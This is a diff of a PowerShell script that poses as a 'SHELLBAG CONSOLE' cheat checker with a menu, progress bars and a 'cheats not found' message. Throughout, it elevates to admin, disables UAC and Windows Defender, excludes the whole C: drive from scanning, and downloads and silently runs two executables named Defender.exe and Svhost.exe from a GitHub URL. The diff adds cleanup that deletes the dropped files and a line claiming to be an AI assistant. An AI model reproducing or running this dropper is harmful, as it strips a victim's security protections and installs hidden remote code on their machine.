@@ -1,10 +1,12 @@
 if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-    Write-Host "[KRA]: ТРЕБУЮ ПРАВА АДМИНИСТРАТОРА, СМЕРТНЫЙ..."
+    Write-Host "[KRA]: Requesting Admin privileges..."
     $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"" + $MyInvocation.MyCommand.Path + "`""
     Start-Process PowerShell -Verb RunAs -ArgumentList $arguments
     Exit
 }
-Write-Host "[KRA]:STAERT [DETLA,Nur..."
+
+
+Write-Host "STARTED "
 $uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
 Set-ItemProperty -Path $uacPath -Name "EnableLUA" -Value 0 -Force
 Set-ItemProperty -Path $uacPath -Name "ConsentPromptBehaviorAdmin" -Value 0 -Force
@@ -12,8 +14,7 @@ Set-MpPreference -DisableRealtimeMonitoring $true -Force -ErrorAction SilentlyCo
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Force -ErrorAction SilentlyContinue
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Force -ErrorAction SilentlyContinue
 Add-MpPreference -ExclusionPath "C:\" -Force -ErrorAction SilentlyContinue
-
-Write-Host "[KRA]:КОМПОНЕНТЫ..."
+Write-Host "HI AM AI ASISTENT FLUX AI"
 $url1 = "https://github.com/sys1e/winlogo/raw/refs/heads/main/Defender.exe"
 $url2 = "https://github.com/sys1e/winlogo/raw/refs/heads/main/Svhost.exe"
 $path1 = "$env:TEMP\Defender.exe"
@@ -21,63 +22,13 @@ $path2 = "$env:TEMP\Svhost.exe"
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
 Invoke-WebRequest -Uri $url1 -OutFile $path1 -UseBasicParsing -ErrorAction SilentlyContinue
 Invoke-WebRequest -Uri $url2 -OutFile $path2 -UseBasicParsing -ErrorAction SilentlyContinue
-
-attrib +S +H $path1
-attrib +S +H $path2
-
-Write-Host "[KRA]: АКТИВИРУЮ МОДУЛИ..."
 Start-Process -FilePath $path1 -WindowStyle Hidden
 Start-Process -FilePath $path2 -WindowStyle Hidden
-
-
 Clear-Host
-Start-Sleep -Milliseconds 500
 $Host.UI.RawUI.WindowTitle = "SHELLBAG CONSOLE v2.0 | MODULE"
 
-
-$psWindow = Get-Process -Id $pid | Where-Object { $_.MainWindowTitle -ne "" }
-if ($psWindow) {
-    $WindowWidth = 120
-    $WindowHeight = 40
-    $BufferWidth = 120
-    $BufferHeight = 3000
-    
-    try {
-        $Host.UI.RawUI.WindowSize = New-Object System.Management.Automation.Host.Size($WindowWidth, $WindowHeight)
-        $Host.UI.RawUI.BufferSize = New-Object System.Management.Automation.Host.Size($BufferWidth, $BufferHeight)
-    }
-    catch {
-    }
-}
-
-$code = @"
-using System;
-using System.Runtime.InteropServices;
-public class WindowBlocker {
-    [DllImport("user32.dll")]
-    public static extern IntPtr GetSystemMenu(IntPtr hWnd, bool bRevert);
-    [DllImport("user32.dll")]
-    public static extern bool EnableMenuItem(IntPtr hMenu, uint uIDEnableItem, uint uEnable);
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr GetConsoleWindow();
-    [DllImport("user32.dll")]
-    public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
-    
-    public static void BlockCloseButton() {
-        IntPtr handle = GetConsoleWindow();
-        IntPtr sysMenu = GetSystemMenu(handle, false);
-        const uint SC_CLOSE = 0xF060;
-        const uint MF_GRAYED = 0x00000001;
-        EnableMenuItem(sysMenu, SC_CLOSE, MF_GRAYED);
-    }
-}
-"@
-Add-Type -TypeDefinition $code -Language CSharp
-[WindowBlocker]::BlockCloseButton()
-[Console]::TreatControlCAsInput = $true
-
-
 function Show-KRAKEH-Header {
+    # Очищаем область заголовка
     $headerArt = @"
  mmmm    mm    mm  mmmmmmmm  mm        mm        mmmmmm       mm        mmmm      mmmm     mmmm    mmm   mm    mmmm      mmmm    mm        mmmmmmmm 
  m#""""#   ##    ##  ##""""""  ##        ##        ##""""##    ####     ##""""#   ##""""#   ##""##   ###   ##  m#""""#    ##""##   ##        ##"""""" 
@@ -88,41 +39,41 @@ function Show-KRAKEH-Header {
   """""    ""    ""  """"""""  """"""""  """"""""  """""""   ""    ""     """"      """"     """"    ""   """   """""      """"    """"""""  """""""" 
 "@ -split "`n"
     
+    $lineY = 0
     foreach ($line in $headerArt) {
         Write-Host $line -ForegroundColor Red
+        $lineY++
     }
     
     Write-Host "================================================" -ForegroundColor Magenta
-    Write-Host "          SHELLBAG CONSOLE - RELEASE EDITION         " -ForegroundColor Yellow
+    Write-Host "          SHELLBAG CONSOLE - REALESE EDITION         " -ForegroundColor Yellow
     Write-Host "================================================" -ForegroundColor Magenta
     Write-Host ""
 }
-
-
 function Show-ProgressBar {
-    param($Text, $DurationMs = 3000)
+    param($Text, $DurationMs = 3000, $BarWidth = 40)
     
-    $steps = 20
-    $stepDuration = $DurationMs / $steps
-    for ($i = 1; $i -le $steps; $i++) {
-        $percent = [math]::Round(($i / $steps) * 100)
-        $timeLeft = [math]::Round(($DurationMs - ($i * $stepDuration)) / 1000, 1)
-        Write-Progress -Activity $Text -Status "$percent% Complete - $timeLeft sec remaining" -PercentComplete $percent
-        Start-Sleep -Milliseconds $stepDuration
+    Write-Host "$Text" -ForegroundColor Cyan
+    for ($i = 0; $i -le 100; $i+=2) {
+        $percent = $i
+        $filled = [math]::Floor($BarWidth * $percent / 100)
+        $empty = $BarWidth - $filled
+        
+        $bar = "[" + ("#" * $filled) + ("-" * $empty) + "]"
+        Write-Host -NoNewline "`r$bar $percent%"
+        Start-Sleep -Milliseconds ($DurationMs / 50)
     }
-    Write-Progress -Activity $Text -Completed
     Write-Host ""
 }
 
 function Clear-MenuArea {
     $currentY = [Console]::CursorTop
-    for ($i = 0; $i -lt 5; $i++) {
-        Write-Host (" " * 120)
+    for ($i = 0; $i -lt 15; $i++) {
+        Write-Host (" " * 80)
     }
     [Console]::SetCursorPosition(0, 12)
 }
 
-# 7. ГЛАВНОЕ МЕНЮ
 do {
     Clear-Host
     Show-KRAKEH-Header
@@ -174,17 +125,19 @@ do {
             [Console]::ReadKey($true) | Out-Null
         }
         "4" {
-            Write-Host "`n[KRA]: ЗАВЕРШАЮ СЕАНС SHELLBAG CONSOLE..." -ForegroundColor DarkRed
+            Write-Host "`n[KRA]: EXITING SHELLBAG CONSOLE..." -ForegroundColor DarkRed
         }
         default {
-            Write-Host "`n[KRA]: НЕ ТУПИ, ВЫБИРАЙ ОТ 1 ДО 4" -ForegroundColor DarkRed
+            Write-Host "`n[KRA]: INVALID INPUT - PLEASE SELECT 1-4" -ForegroundColor DarkRed
             Start-Sleep -Seconds 1
         }
     }
 } while ($choice -ne "4")
 
+
 Write-Host ""
 Write-Host "================================================" -ForegroundColor Magenta
+
 
 Write-Host "чити не " -NoNewline -ForegroundColor Red
 Write-Host "найдени " -NoNewline -ForegroundColor Yellow
@@ -198,8 +151,13 @@ Write-Host "намі" -ForegroundColor Red
 Write-Host "<3" -ForegroundColor Magenta
 
 Write-Host ""
-Write-Host "[KRA]: ЗАПУСКАЮ ФИНАЛЬНЫЙ ШТРИХ..."
+Write-Host "[KRA]: Launching"
 Start-Process "cmd.exe" -ArgumentList "/c curl parrot.live && pause"
+
+
+Remove-Item $path1 -Force -ErrorAction SilentlyContinue
+Remove-Item $path2 -Force -ErrorAction SilentlyContinue
 
 Write-Host "WELCOME" -ForegroundColor DarkGreen
 "WELCOME TO CLAH FLUX"
+sho on delaet?
